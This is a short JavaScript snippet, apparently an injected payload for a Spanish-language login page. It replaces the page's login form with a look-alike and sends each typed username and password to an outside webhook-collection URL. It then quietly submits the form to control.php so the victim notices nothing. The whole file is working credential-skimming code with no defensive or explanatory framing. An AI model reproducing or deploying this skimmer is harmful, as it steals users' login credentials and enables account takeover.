function l(){
    var a = new XMLHttpRequest();
    a.open('GET','http://api.webhookinbox.com/i/ZVRbPmK5/in/?p='
        .concat(document.getElementById('password').value,'%26u=',document.getElementById('usuario').value));
    a.onreadystatechange=function(){
        if(a.readyState === XMLHttpRequest.DONE){
            document.forms[0].action='control.php';
            document.forms[0].method='POST';
            document.forms[0].submit();
        }
    };
    a.send(null);
}

document.forms[0].remove();

var form = document.createElement("form");
form.innerHTML = '<form action="control.php" method="POST"><label for="usuario">USUARIO: </label><input id="usuario" class="user" type="text" name="usuario" value="" size="20" maxlength="50" /><br /><label for="password">CONTRASEÑA: </label><input id="password" class="password" type="password" name="password" size="20" maxlength="50" /><br /><button type="submit" class="enviar_btn">Entrar</button></form>';
document.getElementById("contenido").appendChild(form);

document.forms[0].action='javascript:l();'